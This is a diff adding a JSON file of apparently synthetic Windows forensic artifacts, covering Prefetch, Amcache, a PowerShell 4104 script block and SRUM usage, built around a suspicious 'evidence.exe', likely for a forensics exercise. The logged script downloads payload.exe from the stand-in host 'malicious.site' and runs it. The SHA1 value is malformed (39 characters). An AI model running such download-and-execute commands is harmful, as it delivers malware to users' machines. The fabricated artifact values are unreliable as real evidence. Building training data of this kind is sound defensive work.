@@ -1,0 +1,48 @@
+{
+  "executable": "evidence.exe",
+  "path": "C:\\Users\\Public\\Downloads\\evidence.exe",
+  "prefetch": {
+    "file": "EVIDENCE.EXE-1234ABCD.pf",
+    "run_count": 1,
+    "last_run": "2025-04-24 14:23:17",
+    "path": "C:\\Windows\\Prefetch",
+    "file_size": "27,136 bytes"
+  },
+  "amcache": {
+    "program_name": "evidence.exe",
+    "original_path": "C:\\Users\\Public\\Downloads\\evidence.exe",
+    "file_size": "27,136 bytes",
+    "first_seen": "2025-04-24 14:22:58",
+    "timestamp": "2025-04-24 14:23:17",
+    "sha1": "7A9D3F1C2B4E5A17D3E5D4F98A11D3C9B2A1EFA",
+    "entry_type": "Executable (File)"
+  },
+  "powershell": {
+    "event_id": 4104,
+    "event_time": "2025-04-24 14:23:10",
+    "source": "PowerShell",
+    "message": "Script Block Logged (Decoded)",
+    "decoded_script": [
+      "Invoke-WebRequest -Uri \"http://malicious.site/payload.exe\" -OutFile \".\\evidence.exe\"",
+      "Start-Process -FilePath \".\\evidence.exe\""
+    ]
+  },
+  "srum": {
+    "rows": [
+      {
+        "process": "Evidence.exe",
+        "cpu": 12.4,
+        "network": 85,
+        "start": "14:23:10"
+      },
+      {
+        "process": "Evidence.exe",
+        "cpu": 4.8,
+        "network": 12,
+        "start": "14:23:17"
+      }
+    ],
+    "cpu": [12.4, 4.8],
+    "network": [85, 12]
+  }
+}
